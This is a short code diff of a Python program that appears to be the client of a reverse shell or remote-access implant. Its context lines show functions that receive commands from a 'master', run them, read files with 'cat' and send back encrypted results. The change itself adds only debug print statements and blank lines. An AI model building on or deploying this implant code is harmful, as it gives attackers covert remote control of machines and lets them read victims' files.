@@ -5,7 +5,6 @@ from os import dup2, fork, listdir, getcwd, system
 from subprocess import run, Popen, DEVNULL
 from time import sleep
 
-
 from utils.crypto import crypto_run
 
 
@@ -32,6 +31,7 @@ def send_res(conn, res):
         encrypted_res = crypto_run("encrypt", encoded_res)
         conn.send(encrypted_res)
     except socket_error:
+        print("error1")
         # error sending data to master
         exit(0)
     return conn
@@ -45,6 +45,7 @@ def recv_cmd(conn, buffer):
         cmd = encoded_cmd.decode("utf-8")
         return conn, cmd
     except socket_error:
+        print("error2")
         # error connecting to master to recv data, reborn
         exit(0)
 
@@ -65,9 +66,11 @@ def cmd_shell(conn, master_hostname, master_port):
             for resp in resp_list:
                 res += resp + "\n"
             conn = send_res(conn, res)
+
         elif cmd[:3] == "pwd":
             res = str(getcwd())
             conn = send_res(conn, res)
+
         elif cmd[:3] == "cat":
             data = ""
             try:
